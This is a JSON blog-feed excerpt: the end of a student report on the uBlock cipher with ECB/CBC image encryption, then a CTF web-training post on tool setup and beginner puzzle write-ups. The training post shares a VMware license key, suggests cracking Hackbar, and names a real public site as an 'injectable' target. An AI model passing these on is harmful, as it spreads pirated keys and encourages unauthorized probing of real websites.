识别代码生成）</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps33.jpg)</p>\n<p>图 7 uBlock 代码设计流程图</p>\n<h5 id=\"52-评估正确性\"><a class=\"anchor\" href=\"#52-评估正确性\">#</a> <strong>5.2 评估正确性</strong></h5>\n<p>依据官方文档中的测试函数，以：<br />\n明文：01 23 45 67 89 ab cd effe dc ba 98 76 54 32 10</p>\n<p>密钥：01 23 45 67 89 ab cd effe dc ba 98 76 54 32 10</p>\n<p>加密 1 次时，输出的密文应该是 32 12 2b ed d0 23 c4 29 02 34 70 e1 15 8c 14 7d</p>\n<p>加密 1000000 时，输出的密文应该是 9d 63 9e 31 06 2f fb 57 46 46 e4 28 f9 2e 08 d4</p>\n<p>根据我们的代码生成结果，如下图（中间部分为其他测试结果）：<br />\n![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps34.jpg)</p>\n<p>图 8 uBlock 代码输出结果</p>\n<p>如上图我们可以知道，代码的正确性良好。与官方文档符合。</p>\n<p>根据后续输出，我们可以发现代码生成的轮密钥也与官方文档一致，代码可行度高。</p>\n<h5 id=\"53-评估吞吐量和速度\"><a class=\"anchor\" href=\"#53-评估吞吐量和速度\">#</a> <strong>5.3 评估吞吐量和速度</strong></h5>\n<p>我的电脑使用的是 NVIDIA GeForce RTX 3070 Ti Laptop GPU、处理器\t12th Gen Intel (R) Core (TM) i9-12900H，2500 Mhz，14 个内核，20 个逻辑处理器、BIOS 版本 / 日期 American Megatrends International, LLC. G533ZW.324, 2023/2/21。其中我的 Python 解释器是 Python3.11，编译器是 pycharm2023.7 专业版。而我的 cpp 运行软件为 vscode。<br />\n这里我以将信息反复加密 1000000 次的时间作为标准。以其运行的时间作为评价的指标。当我们明文和密文均为 01 23 45 67 89 ab cd effe dc ba 98 76 54 32 10 时，多次运算测试代码取平均值可以得到：<br />\nuBlock 128-128 的运算时间为 1.162s![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps35.jpg)</p>\n<p>uBlock 128-256 的运算时间为 1.381s![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps36.jpg)</p>\n<p>uBlock 256-256 的运算时间为 1.605s![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps37.jpg)</p>\n<p>而在 Python 上运行的传统 AES 代码的运行时间为 29.93s![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps38.jpg)</p>\n<p>其中不排除 C++ 运行效率比 Python 高效等因素。但是总体来说，uBlock 在无论是吞吐量还是运行速度方向都表现出较高的效率和运算速度。相比于传统 AES 加密算法显得更加高效的同时准确率也表现得很优异。</p>\n<h2 id=\"6-以ublock的ecb和cbc模式加密朱鹮bmp文件\"><a class=\"anchor\" href=\"#6-以ublock的ecb和cbc模式加密朱鹮bmp文件\">#</a> <strong>6 以 uBlock 的 ECB 和 CBC 模式加密朱鹮.bmp 文件</strong></h2>\n<h4 id=\"61-bmp文件格式解析\"><a class=\"anchor\" href=\"#61-bmp文件格式解析\">#</a> <strong>6.1 BMP 文件格式解析</strong></h4>\n<p>BMP 文件格式，全称为 Bitmap Image File Format，是一种图像文件格式，广泛用于 Windows 操作系统中存储位图图像。这种格式简单、直观，支持多种色深，并可以无损地存储图像数据。BMP 文件主要由三部分组成：</p>\n<p><em><strong>*(1)*</strong></em><em><strong>* 文件头 *</strong></em>（Bitmap File Header）：<br />\n包含文件类型、文件大小和数据偏移等信息。</p>\n<p>bfType（2 字节）：文件类型，必须是 'BM'，用以标识文件为 BMP 格式。</p>\n<p>bfSize（4 字节）：整个文件的大小，包括文件头、信息头和位图数据。</p>\n<p>bfReserved1 和 bfReserved2（各 2 字节）：保留位，对齐用，通常为 0。</p>\n<p>bfOffBits（4 字节）：从文件开始到位图数据的偏移量。</p>\n<p><em><strong>*(2)*</strong></em><em><strong>* 信头 *</strong></em>（DIB Header，即 Device Independent Bitmap Header）：BMP 文件的信息头有几种不同的版本，最常见的包括 BITMAPINFOHEADER 和 BITMAPV5HEADER 等。以 BITMAPINFOHEADER 为例，其结构如下：</p>\n<p>提供图像宽度、高度、色深、压缩类型等详细信息。</p>\n<p>biSize（4 字节）：此结构体的大小。</p>\n<p>biWidth（4 字节）：图像的宽度（像素）。</p>\n<p>biHeight（4 字节）：图像的高度（像素）。如果为正，位图是倒向的；如果为负，位图是正向的。biPlanes（2 字节）：目标设备的级别，必须为 1。</p>\n<p>biBitCount（2 字节）：每个像素所需的位数，常见的有 1、4、8、16、24 和 32。</p>\n<p>biCompression（4 字节）：位图的压缩类型。</p>\n<p>biSizeImage（4 字节）：位图数据的大小，即像素数据部分的大小。</p>\n<p>biXPelsPerMeter, biYPelsPerMeter（各 4 字节）：水平和垂直分辨率（每米像素数）。</p>\n<p>biClrUsed（4 字节）：位图实际使用的颜色表中的颜色索引数（0 表示使用所有的颜色）。</p>\n<p>biClrImportant（4 字节）：重要颜色数，0 表示所有颜色都是重要的。</p>\n<p><em><strong>*(3)*</strong></em><em><strong>* 位图数据 *</strong></em>（Bitmap Data）：<br />\n实际的图像像素数据 —— 位图数据部分存储实际的图像像素值。这部分的存储格式依赖于 biBitCount 的值。数据可能需要根据行来进行填充，以确保每行的字节数是 4 的倍数（DWORD 对齐）。</p>\n<h4 id=\"62-bmp文件加密技巧\"><a class=\"anchor\" href=\"#62-bmp文件加密技巧\">#</a> <strong>6.2 bmp 文件加密技巧</strong></h4>\n<p>当使用 uBlock 或任何其他块加密算法对 BMP 文件进行加密时，主要关注的是位图数据部分。文件头和信息头通常不进行加密，以便保持文件格式的完整性，使图像文件仍然能被图像查看器识别。以下是一些注意事项和技巧：</p>\n<p>保持文件头和信息头不变：加密时应跳过这部分，直接从位图数据开始加密，这样不会破坏文件的结构 —— 在代码中体现为对 BMP 的前 54 个字节（文件头）不进行加密，以保证图片格式可以清晰显示</p>\n<p>处理数据填充：由于加密算法通常要求数据块大小固定，而 BMP 行可能不会恰好符合这种分块，所以加密前需要对数据进行适当的填充</p>\n<p>选择加密模式：使用 ECB 模式可能会导致图像中的模式被重复，使得加密不够安全。CBC 模式是一个更好的选择，因为它使用初始化向量（IV）来增加加密强度 —— 但是由于老师要求，这里使用 ECB 和 CBC 两种模式来进行加密。</p>\n<h4 id=\"63-ecb和cbc模式加解密结果\"><a class=\"anchor\" href=\"#63-ecb和cbc模式加解密结果\">#</a> <strong>6.3 ECB 和 CBC 模式加解密结果</strong></h4>\n<h5 id=\"631-ecb模式进行加解密\"><a class=\"anchor\" href=\"#631-ecb模式进行加解密\">#</a> <strong>6.3.1 ECB 模式进行加解密</strong></h5>\n<p>在附件中通过 vscode 启动 uBlock_bmp (加密代码)——ECB 加密 .cpp 代码，该代码以 {0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10}; 为密钥，循环读入朱鹮.bmp 进行加解密。加密朱鹮.bmp 产生朱鹮_ECB.bmp。读入朱鹮_ECB.bmp 解密后产生朱鹮_ECB_dec.bmp。具体的加密算法请见附件。加密结果如下图:</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps39.jpg)![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps40.jpg)</p>\n<p>图 9（左）朱鹮_ECB.bmp</p>\n<p>图 10（右）朱鹮_ECB_dec.bmp</p>\n<h5 id=\"632-cbc模式进行加解密\"><a class=\"anchor\" href=\"#632-cbc模式进行加解密\">#</a> <strong>6.3.2 CBC 模式进行加解密</strong></h5>\n<p>在附件中通过 vscode 启动 uBlock_bmp (加密代码)——CBC 加密.cpp 代码，该代码以 {0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98, 0x76, 0x54, 0x32, 0x10}; 为密钥，循环读入朱鹮.bmp 进行加解密。加密朱鹮.bmp 产生朱鹮_CBC.bmp。读入朱鹮_CBC.bmp 解密后产生朱鹮_CBC_dec.bmp。具体的加密算法请见附件。加密结果如下图：</p>\n<p>![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps41.jpg)![img](file:///C:\\Users\\JackDu\\AppData\\Local\\Temp\\ksohtml29368\\wps42.jpg)</p>\n<p>图 11（左）朱鹮_CBC.bmp</p>\n<p>图 12（右）朱鹮_CBC_dec.bmp</p>\n<h5 id=\"633-ecb和cbc模式的分析与对比\"><a class=\"anchor\" href=\"#633-ecb和cbc模式的分析与对比\">#</a> <strong>6.3.3 ECB 和 CBC 模式的分析与对比</strong></h5>\n<p><em><strong>* 安全性：*</strong></em></p>\n<p>CBC 模式通常比 ECB 模式更安全，因为它避免了明文中的模式在密文中的重复 ——CBC 模式加密前，每个数据块都会与前一个密文块进行异或。第一块数据与一个初始向量（IV）进行异或。这种方法使得相同的明文块加密后的结果因其位置不同而不同，提高了安全性。同样的明文在不同的位置或在不同的文件中，即使使用相同的密钥，加密结果也会不同。</p>\n<p>而 ECB 模式将数据分割成块，每块数据独立加密。缺点是同一块明文在同一密钥下总是被加密成同样的密文块。这意味着模式可能会暴露明文的模式，特别是当处理大量具有重复模式的数据时（例如图片或某些类型的文档）。在图像加密（如本次的 bmp）中尤其明显，因为图像中经常包含大片相同颜色的区域。</p>\n<p><em><strong>* 性能：*</strong></em></p>\n<p>ECB 模式可以并行处理，因为每个数据块独立加密，提高了加密过程的速度。而 CBC 模式不能并行处理，因为每个块的加密依赖于前一个块的密文。这可能会在处理大量数据时导致性能下降。解密可以并行化，因为解密过程中，每个块的解密只依赖于它前面的一个块的密文。</p>\n<h2 id=\"7-总结\"><a class=\"anchor\" href=\"#7-总结\">#</a> <strong>7 总结</strong></h2>\n<p>在这篇论文中，我对 uBlock 和 ECB 两种加密算法进行了深入的研究与比较。通过细致的分析，我发现 uBlock 算法具有复杂的密钥扩展和多轮加密机制，这些设计显著增强了其加密强度和安全性，使其特别适用于对数据安全要求极高的场景。相比之下，ECB 模式因其简单的结构，在处理具有重复模式的大量数据时表现出安全性的不足，尤其在需要高安全性的应用中可能导致数据泄露风险。</p>\n<p>我还特别关注了这两种算法在不同硬件和软件环境中的性能表现。研究结果显示，uBlock 在现代处理器上具有出色的运行效率和较低的资源消耗，这使得它非常适合在需要快速数据处理和高吞吐量的系统中使用。此外，我也评估了 ECB 模式的实现简便性，这一特点使其在某些不需要高安全性的内部或封闭系统中仍具有应用价值。</p>\n<p>通过本研究，我进一步理解了在算法设计中安全性和效率的重要性以及如何在实际应用中做出适当的权衡。论文的这部分研究不仅增强了我对加密算法性能和安全性的认识，也为将来选择和设计加密方案提供了实用的指导。</p>\n<p>最后，展望未来，我认为加密算法的发展需要持续关注安全性的提升和性能的优化。随着计算资源的发展和安全威胁的演变，持续更新和改进加密技术将是确保信息安全的关键。因此，我期待在未来的工作中，进一步探索和实验新的加密技术，以应对更为复杂和多变的安全环境。这篇论文为我在密码学领域的研究提供了坚实的基础，并激励我继续在这一领域深入探索与创新。</p>\n",
            "tags": [
                "Hexo",
                "Front Matter",
                "code",
                "recommendation"
            ]
        },
        {
            "id": "https://enjundu.github.io/ctf/nscweb%E6%8E%88%E8%AF%BE/",
            "url": "https://enjundu.github.io/ctf/nscweb%E6%8E%88%E8%AF%BE/",
            "title": "NSC暑期培训——web",
            "date_published": "2024-07-07T01:41:31.000Z",
            "content_html": "<h1 id=\"攻防世界账号注册\"><a class=\"anchor\" href=\"#攻防世界账号注册\">#</a> 攻防世界账号注册</h1>\n<p>在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuLw==\">攻防世界</span>官网注册账号。<br />\n网址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuLw==\">https://adworld.xctf.org.cn/</span></p>\n<h1 id=\"vmware安装\"><a class=\"anchor\" href=\"#vmware安装\">#</a> VMware 安装</h1>\n<ol>\n<li>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudm13YXJlLmNvbS9jbi9wcm9kdWN0cy93b3Jrc3RhdGlvbi1wcm8vd29ya3N0YXRpb24tcHJvLWV2YWx1YXRpb24uaHRtbA==\">官网地址</span>:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudm13YXJlLmNvbS9jbi9wcm9kdWN0cy93b3Jrc3RhdGlvbi1wcm8vd29ya3N0YXRpb24tcHJvLWV2YWx1YXRpb24uaHRtbA==\">https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html</span></p>\n</li>\n<li>\n<p>进入官网选择<strong> for windows</strong>.</p>\n</li>\n<li>\n<p>下载完后双击点开，点击下一步</p>\n</li>\n<li>\n<p>遇到安装路径请自定义【不要什么都堆到 C 盘！！】，然后选择增强型键盘驱动程序和将控制台工具添加到系统 PATH</p>\n</li>\n<li>\n<p>根据自身情况适当选择 “启动时检查产品更新” 与 “帮助完善 VMware Workstation Pro” 复选框，然后单击 “下一步”</p>\n</li>\n<li>\n<p>下一步，【建议点击添加到桌面】</p>\n</li>\n<li>\n<p>安装</p>\n</li>\n<li>\n<p>安装完成后输入许可证，VMware 16 的许可证如下<br />\n <code>YF390-0HF8P-M81RQ-2DXQE-M2UT6</code></p>\n<p>若不可用请自行百度可用版本</p>\n</li>\n<li>\n<p>安装完成后即可使用</p>\n</li>\n</ol>\n<h1 id=\"kaliubuntu安装\"><a class=\"anchor\" href=\"#kaliubuntu安装\">#</a> kali&amp;Ubuntu 安装</h1>\n<p>为 <code>我</code> 了 <code>懒</code> 锻 <code>得</code> 炼 <code>写</code> 同学们的自行搜索能力，请自行 csdn 或者百度搜索 Kali 或 Ubuntu 的下载</p>\n<p>确保<strong>至少</strong>成功在 VM 上安装一个！</p>\n<h1 id=\"java安装\"><a class=\"anchor\" href=\"#java安装\">#</a> Java 安装</h1>\n<ol>\n<li>打开点击链接进入下载界面</li>\n</ol>\n<p>​\t\t<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9qYXZhL3RlY2hub2xvZ2llcy9qYXZhc2UvamF2YXNlOHUyMTEtbGF0ZXItYXJjaGl2ZS1kb3dubG9hZHMuaHRtbA==\">网页链接</span></p>\n<p>​\t\t<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9qYXZhL3RlY2hub2xvZ2llcy9qYXZhc2UvamF2YXNlOHUyMTEtbGF0ZXItYXJjaGl2ZS1kb3dubG9hZHMuaHRtbA==\">https://www.oracle.com/java/technologies/javase/javase8u211-later-archive-downloads.html</span></p>\n<ol start=\"2\">\n<li>\n<p>选择制定版本 java jdk 下载</p>\n<ul>\n<li>Java SE Development Kit 8u211</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC5vcmFjbGUuY29tL290bi9qYXZhL2pkay84dTIxMS1iMTIvNDc4YTYyYjdkNGUzNGI3OGI2NzFjNzU0ZWFhZjM4YWIvamRrLTh1MjExLXdpbmRvd3MteDY0LmV4ZQ==\">jdk-8u211-windows-x64.exe</span></li>\n<li>点击下载后注册登录 Oracle 即可下载</li>\n</ul>\n<p><img data-src=\"https://s2.loli.net/2024/07/07/WpQ5CIL8Hw1Olhs.png\" alt=\"image.png\" /></p>\n</li>\n<li>\n<p>点击下载包并且安装网页，记住你的下载地址【默认为 C:\\Program Files\\Java\\jdk1.8.0_211】<br />\n注：一般而言，计算机软件我们都<strong>不推荐在 C 盘安装</strong>。在 C 盘安装会影响计算机的运行。但是<strong> JAVA 特例</strong>，我们通常安在 C 盘，这样<strong>使得 Java 的优先级更高</strong>。无需去其他盘访问。</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/07/OiWJjsR1oPdkgGm.png\" alt=\"image.png\" /></p>\n</li>\n<li>\n<p>安装后就会出现一个<strong> jdk 文件夹和 jar 文件夹</strong></p>\n</li>\n<li>\n<p>jre 是 java runtime environment, 是 java 程序的运行环境。既然是运行，当然要包含 jvm，也就是虚拟机，还有所有 java 类库的 class 文件，都在 lib 目录下打包成了 jar。在 windows 上的虚拟机是 jre/bin/client 里面是一个 jvm.dll。</p>\n</li>\n<li>\n<p>jdk 是 java development kit，是 java 的开发工具包，主要是给 ide 用的，里面包含了各种类库和工具。当然也包括了另外一个 Jre.，而且 jdk/jre/bin 里面也有一个 server 文件夹， server 文件夹下面也有一个 jvm.dll 虚拟机。（这个虚拟机是什么后，面会涉及）</p>\n</li>\n<li>\n<p><strong>环境配置</strong>：Windows 下面搜索框搜索并打开<strong>编辑系统环境变量</strong><br />\n<img data-src=\"https://s2.loli.net/2024/07/07/jtxluQsB1YobrAV.png\" alt=\"image.png\" /></p>\n</li>\n<li>\n<p>用户变量界面新建<br />\n<strong> JAVA_HOME</strong> 变量名 (一定要大写！)</p>\n<p>变量值为<strong> C:\\Program Files\\Java\\jdk1.8.0_211</strong>（替换为你实际的 jdk 地址）</p>\n<p>再次新建：</p>\n<p>变量名：classpath（这次要小写）</p>\n<p>变量值：有点难你直接复制就行</p>\n<p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">,;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar;</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://s2.loli.net/2024/07/07/36vYcZ2eFGgLQJS.png\" alt=\"image.png\" /></p>\n</li>\n<li>\n<p>在系统变量里找到 Path 目录然后点击进去添加 jdk 的 bin 目录（一般是 C:\\Program Files\\Java\\jdk1.8.0_211\\bin）<br />\n<img data-src=\"https://s2.loli.net/2024/07/07/mxUqTHKiAjgCz1y.png\" alt=\"image.png\" /><img data-src=\"https://s2.loli.net/2024/07/07/bP6WM1hAOcd49pt.png\" alt=\"image.png\" /></p>\n</li>\n<li>\n<p>Win+R 弹出运行窗口，输入 cmd 后弹出 DOS 命令窗口</p>\n<p>然后输入<strong> java -version</strong>，如果出现如下信息，说明已经安装完成<br />\n<img data-src=\"https://s2.loli.net/2024/07/07/shXN3tuDwxdrCWc.png\" alt=\"image.png\" /></p>\n</li>\n<li>\n<p>over</p>\n</li>\n<li>\n<p>**What's more:**java 编译器：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9taXJyb3Iua2FrYW8uY29tL2VjbGlwc2UvdGVjaG5vbG9neS9lcHAvZG93bmxvYWRzL3JlbGVhc2UvMjAyNC0wNi9SL2VjbGlwc2UtamVlLTIwMjQtMDYtUi13aW4zMi14ODZfNjQuemlwJUVGJUJDJThDJUU5JTgwJTg5JUU2JThCJUE5JUU2JTgwJUE3JUU0JUI4JThCJUU4JUJEJUJEJUVGJUJDJTg4JUU2JTlDJUFDJUU4JUFGJUJFJUU3JUE4JThCJUU0JUI4JThEJUU3JUExJUFDJUU2JTgwJUE3JUU4JUE2JTgxJUU2JUIxJTgyJUVGJUJDJTg5JUUzJTgwJTgy\">https://mirror.kakao.com/eclipse/technology/epp/downloads/release/2024-06/R/eclipse-jee-2024-06-R-win32-x86_64.zip，选择性下载（本课程不硬性要求）。</span></p>\n</li>\n</ol>\n<h1 id=\"火狐浏览器安装配置hackbar\"><a class=\"anchor\" href=\"#火狐浏览器安装配置hackbar\">#</a> 火狐浏览器安装 &amp; 配置 Hackbar</h1>\n<p>Hackbar 推荐使用火狐浏览器下载拓展，具体方法请 csdn，直接下载 Hackbar V2 即可。（原版 Hackbar 现在需要收费，如果你能通过破解教程成功破解也行。）<br />\n之后的课程中使用的拓展也是火狐浏览器里的 Hackbar V2</p>\n<h1 id=\"暂时不用\"><a class=\"anchor\" href=\"#暂时不用\">#</a> 暂时不用</h1>\n<h2 id=\"chorme浏览器安装\"><a class=\"anchor\" href=\"#chorme浏览器安装\">#</a> Chorme 浏览器安装</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9jaHJvbWUvI2V1bGE=\">最新稳定版（Stable Channel）Chrome 在线安装</span>:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9jaHJvbWUvI2V1bGE=\">https://www.google.com/chrome/#eula</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9jaHJvbWUvP2V4dHJhPWJldGFjaGFubmVs\">最新测试版（Beta Channel）Chrome 在线安装</span>:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9jaHJvbWUvP2V4dHJhPWJldGFjaGFubmVs\">https://www.google.com/chrome/?extra=betachannel</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2RsLmdvb2dsZS5jb20vY2hyb21lL2luc3RhbGwvMjY2LjAvY2hyb21lX2luc3RhbGxlci5leGU=\">离线下载地址</span>:<span class=\"exturl\" data-url=\"aHR0cDovL2RsLmdvb2dsZS5jb20vY2hyb21lL2luc3RhbGwvMjY2LjAvY2hyb21lX2luc3RhbGxlci5leGU=\">http://dl.google.com/chrome/install/266.0/chrome_installer.exe</span></p>\n<h2 id=\"hackbar安装\"><a class=\"anchor\" href=\"#hackbar安装\">#</a> Hackbar 安装</h2>\n<ul>\n<li>打开 Chrome 浏览器，然后打开 “<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaHJvbWUuZ29vZ2xlLmNvbS93ZWJzdG9yZS9jYXRlZ29yeS9leHRlbnNpb25z\">chrome 网上应用店</span>”，在搜索框搜索 “<strong>hackbar</strong>”</li>\n<li>搜索完成后，选择 hackbar 插件，点击 “<strong>添加至 Chrome</strong>”，会弹出框询问 “<strong>要添加‘HackBar’吗？</strong>”，点击 “<strong>添加扩展程序</strong>”</li>\n<li>等待几秒钟后，添加完成，浏览器右上角会出现一个黑色的小图标，表示 HackBar 已添加成功！</li>\n<li>随便找一个可注入网站，比如 https://www.xuetangx.com/，进入后按 F12，如果出现 Harckbar 选项，说明安装完成</li>\n</ul>\n<p><img data-src=\"https://s2.loli.net/2024/07/08/aT2BLS6xV1dWmRE.png\" alt=\"image.png\" /></p>\n<h1 id=\"小明的表情包\"><a class=\"anchor\" href=\"#小明的表情包\">#</a> 小明的表情包</h1>\n<p>首先我们可以发现有一串密码为 “AVARGRRA AVARGL AVAR”，这个密码实在是太短了。我们上述才提到过的网站即可轻松爆破。</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/23/eD8uGs9vPMBYnZE.png\" alt=\"image.png\" /></p>\n<p>我们可以知道他的年份为 1999 年，而题目中是 “日月年”，故我们知道其压缩包密码为 xxxx1999, 根据这个原理我们采用 “zip 暴力破解器” 进行暴力破解，并设置格式为 xxxx1999，最终我们可以得到暴力破解后的压缩包密码为 “07071999”。解压该文件。</p>\n<p>密码 07071999</p>\n<p>解压后打开发现小明的表情包.jpg 为损坏文件，故我们需要使用 010editor 来分析他。</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/23/fx4QS5lkFVbK1sW.png\" alt=\"image.png\" /></p>\n<p>我们发现该 jpg 图片缺少头文件。由于 JPG 的头文件为 FFD8FFE1，我们检查发现下面小红框为 0000FFE1，故我们将其修改为 FFD8FFE1 后，删除前面的一行十六进制 data 后点击保存然后查看图片。即可得到图片。</p>\n<p><img data-src=\"https://s2.loli.net/2024/07/23/d2BKH3qGZ1VEL9Y.png\" alt=\"image.png\" /></p>\n<h1 id=\"社会主义核心价值观\"><a class=\"anchor\" href=\"#社会主义核心价值观\">#</a> 社会主义核心价值观</h1>\n<p css-module=\".\">你对社会主义核心价值观学习得怎么样？ 下面来考考你吧～<br />\n 答案格式: flag</p>\n<p>自由友善敬业自由友善爱国和谐自由平等法治和谐自由和谐平等自由自由和谐和谐自由诚信平等自由文明平等和谐平等法治平等敬业平等敬业平等友善自由平等爱国自由法治自由文明平等富强平等自由自由和谐自由友善爱国自由诚信民主和谐法治自由法治自由公正平等民主平等法治自由友善敬业自由诚信和谐和谐和谐自由公正自由法治自由友善爱国平等自由自由自由自由友善敬业自由友善法治自由诚信文明自由文明自由诚信平等平等文明和谐公正平等民主和谐诚信和谐和谐诚信和谐和谐诚信和谐和谐友善法治</p>\n<ul>\n<li>\n<p>社会主义核心价值观解码</p>\n</li>\n<li>\n<p>base32</p>\n</li>\n<li>\n<p>单表代换：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">shift_cipher</span>(<span class=\"params\">text</span>):</span><br><span class=\"line\">    result = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> text:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&#x27;a&#x27;</span> &lt;= char &lt;= <span class=\"string\">&#x27;z&#x27;</span>:</span><br><span class=\"line\">            shifted = <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(char) - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>) - <span class=\"number\">13</span>) % <span class=\"number\">26</span> + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>))</span><br><span class=\"line\">            result.append(shifted)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"string\">&#x27;A&#x27;</span> &lt;= char &lt;= <span class=\"string\">&#x27;Z&#x27;</span>:</span><br><span class=\"line\">            shifted = <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(char) - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>) - <span class=\"number\">13</span>) % <span class=\"number\">26</span> + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>))</span><br><span class=\"line\">            result.append(shifted)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result.append(char)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(result)</span><br><span class=\"line\"></span><br><span class=\"line\">cipher_text = <span class=\"string\">&quot;synt&#123;pelc70_15_1ag3e3f71at&#125;&quot;</span></span><br><span class=\"line\">plain_text = shift_cipher(cipher_text)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(plain_text)</span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<p><strong>flag{cryp70_15_1nt3r3s71ng}</strong></p>\n<h1 id=\"virginia\"><a class=\"anchor\" href=\"#virginia\">#</a> Virginia</h1>\n<p>由题目可知该密码是维吉尼亚密码，试着用之前写的程序直接求密钥，可能是由于没啥规律或是密钥太长，失败了。所幸在找到了一个网站：Vigenere Solver | <span class=\"exturl\" data-url=\"aHR0cDovL2d1YmFsbGEuZGU=\">guballa.de</span>。将 ct.txt 里的原文粘贴进去，然后将 Key Length 改成 161，Break Cipher，得到破解后的原文，与 intro.txt 里的文本进行比较，发现一致，向下翻找到对应 flag。<br />\n<strong>lactf{known_plaintext_and_were_off_to_the_races}</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndWJhbGxhLmRlL3ZpZ2VuZXJlLXNvbHZlcg==\">https://guballa.de/vigenere-solver</span></p>\n<p>Key Length=161</p>\n<h1 id=\"http协议入门\"><a class=\"anchor\" href=\"#http协议入门\">#</a> HTTP 协议入门</h1>\n<h2 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h2>\n<ul>\n<li>\n<p>HTTP 协议是 Hyper TextTransfer Protocol (超文本传输协议) 的缩写，主要用于网页的传输，现在也常应用网络 API 的开发 (Restfu API)。</p>\n</li>\n<li>\n<p>HTTP 是一个 TCP/IP 通信协议的最上层的协议之一 (HTML 文件，图片文件，查询结果等)</p>\n</li>\n<li>\n<p>TCP/IP 协议有需要的可以自行了解</p>\n</li>\n</ul>\n<h2 id=\"示例\"><a class=\"anchor\" href=\"#示例\">#</a> 示例</h2>\n<p><strong>以访问北京理工大学数学实验中心为例</strong>：<span class=\"exturl\" data-url=\"aHR0cDovL21lYy5iaXQuZWR1LmNuLw==\">http://mec.bit.edu.cn/</span></p>\n<ul>\n<li>可以看到北京理工大学属性实验中心使用的是 http 协议传输而非通常的 https</li>\n<li>https 相当于对 http 添加了数字证书加密功能，（你可以理解为对传输内容进行加密），现在的大部分网站均用 https 进行传输，而身为顶尖学校的北理工官方网站却仍然使用 http，令人费解。（bushi）</li>\n<li>我们这里先介绍 http</li>\n</ul>\n<p><img data-src=\"https://s2.loli.net/2024/07/08/So9dnsr8j2v3feU.png\" alt=\"image.png\" /></p>\n<h2 id=\"基本工作原理\"><a class=\"anchor\" href=\"#基本工作原理\">#</a> 基本工作原理</h2>\n<ul>\n<li>HTTP 是浏览器或者其他客户端 (如手机 App) 和网站服务器之间沟通的协议。</li>\n<li>浏览器作为 HTTP 客户端通过 URL 向 HTTP 服务端即 WEB 服务器发送所有请求。</li>\n<li>常用的 Web 服务器有：Nginx，Apache，IlS 服务器 (微软的产品) 